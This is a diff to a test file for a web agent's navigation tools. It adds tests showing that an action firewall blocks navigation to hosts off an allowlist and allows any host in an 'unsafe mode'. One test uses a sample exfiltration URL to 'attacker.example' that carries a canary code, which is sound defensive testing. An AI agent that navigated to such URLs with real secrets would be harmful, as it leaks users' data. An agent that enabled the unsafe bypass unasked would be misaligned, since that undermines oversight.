@@ -11,6 +11,7 @@ import { WebAgentEventEmitter, WebAgentEventType } from "../../src/events.js";
 import { LanguageModel } from "ai";
 import { z } from "zod";
 import { InvalidRefException, BrowserActionException } from "../../src/errors.js";
+import { SECURITY_BLOCKED_UNTRUSTED_NAVIGATION } from "../../src/security/actionFirewall.js";
 import { generateTextWithRetry } from "../../src/utils/retry.js";
 
 // Mock the ai module
@@ -708,7 +709,9 @@ describe("Web Action Tools", () => {
   });
 
   describe("Navigation Actions", () => {
-    it("should execute goto action successfully", async () => {
+    it("should execute goto action successfully to a trusted host", async () => {
+      context.firewall = { trustedHostnames: new Set(["newsite.com"]), unsafeMode: false };
+      tools = createWebActionTools(context);
       const performActionSpy = vi.spyOn(mockBrowser, "performAction");
       const emitSpy = vi.spyOn(eventEmitter, "emit");
 
@@ -725,6 +728,51 @@ describe("Web Action Tools", () => {
         title: expect.any(String),
         value: "https://newsite.com", // performActionWithValidation adds value field
       });
+    });
+
+    it("should block goto to a host the caller did not name", async () => {
+      // Default context trusts no hosts, so navigation off-allowlist is blocked.
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+      const emitSpy = vi.spyOn(eventEmitter, "emit");
+      const url = "https://attacker.example/collect?code=CANARY-A1B2C3D9";
+
+      const result = await tools.goto.execute({ url });
+
+      expect(result).toEqual({
+        success: false,
+        action: "goto",
+        value: url,
+        error: SECURITY_BLOCKED_UNTRUSTED_NAVIGATION,
+        isRecoverable: true,
+      });
+      // The browser must never navigate — the canary never leaves.
+      expect(performActionSpy).not.toHaveBeenCalled();
+      expect(emitSpy).toHaveBeenCalledWith(
+        WebAgentEventType.FIREWALL_BLOCKED_NON_INTERACTIVE,
+        expect.objectContaining({
+          kind: "navigation",
+          reason: SECURITY_BLOCKED_UNTRUSTED_NAVIGATION,
+        }),
+      );
+      expect(emitSpy).not.toHaveBeenCalledWith(
+        WebAgentEventType.BROWSER_NAVIGATED,
+        expect.anything(),
+      );
+    });
+
+    it("should allow goto to any host in unsafe mode", async () => {
+      context.firewall = { trustedHostnames: new Set<string>(), unsafeMode: true };
+      tools = createWebActionTools(context);
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      const result = await tools.goto.execute({ url: "https://anywhere.example/x" });
+
+      expect(result.success).toBe(true);
+      expect(performActionSpy).toHaveBeenCalledWith(
+        "",
+        PageAction.Goto,
+        "https://anywhere.example/x",
+      );
     });
 
     it("should validate URL format for goto", () => {
@@ -1130,6 +1178,10 @@ describe("Web Action Tools", () => {
     });
 
     it("should handle errors in navigation actions", async () => {
+      // Trust the host so navigation passes the firewall and reaches the browser,
+      // where we simulate a navigation failure.
+      context.firewall = { trustedHostnames: new Set(["bad-site.com"]), unsafeMode: false };
+      tools = createWebActionTools(context);
       vi.spyOn(mockBrowser, "performAction").mockRejectedValueOnce(
         new BrowserActionException("goto", "Navigation failed"),
       );
